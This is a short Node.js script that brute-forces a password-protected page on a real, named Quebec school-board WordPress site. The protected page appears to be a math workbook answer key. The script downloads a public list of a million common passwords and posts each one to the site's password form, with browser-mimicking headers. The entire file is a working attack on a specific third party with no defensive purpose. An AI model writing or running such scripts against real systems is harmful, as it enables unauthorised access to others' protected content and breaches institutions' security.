const axios = require('axios');

// URL to fetch the password database from
const passwordDatabaseUrl = 'https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/10-million-password-list-top-1000000.txt';

// URL to send the web request to
const targetUrl = 'https://projets.cssvdc.gouv.qc.ca/vdcmath/wp-login.php?action=postpass';

// Function to send a web request with a given password
async function sendRequest(password) {
    try {
        const response = await axios.post(targetUrl, `post_password=${password}&Submit=Valider`, {
            headers: {
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                'accept-language': 'en-CA,en;q=0.9,fr-CA;q=0.8,fr;q=0.7,en-US;q=0.6',
                'cache-control': 'max-age=0',
                'content-type': 'application/x-www-form-urlencoded',
                'sec-ch-ua': '"Not.A/Brand";v="8", "Chromium";v="114", "Google Chrome";v="114"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Chrome OS"',
                'sec-fetch-dest': 'document',
                'sec-fetch-mode': 'navigate',
                'sec-fetch-site': 'same-origin',
                'sec-fetch-user': '?1',
                'upgrade-insecure-requests': '1',
                'Referer': 'https://projets.cssvdc.gouv.qc.ca/vdcmath/projets/sec-3/corrige-du-cahier-sommet/',
                'Referrer-Policy': 'strict-origin-when-cross-origin'
            }
        });
        console.log(`Password '${password}' worked! Server responded with status: ${response.status}`);
    } catch (error) {
        console.log(`Password '${password}' failed. Error: ${error.message}`);
    }
}

// Function to fetch the password database from the URL
async function fetchPasswordDatabase() {
    try {
        const response = await axios.get(passwordDatabaseUrl);
        const passwords = response.data.split('\n');
        for (let password of passwords) {
            await sendRequest(password.trim()); // Trim whitespace from the password
        }
    } catch (error) {
        console.error('Error fetching password database:', error.message);
    }
}

// Start fetching and trying passwords
fetchPasswordDatabase();
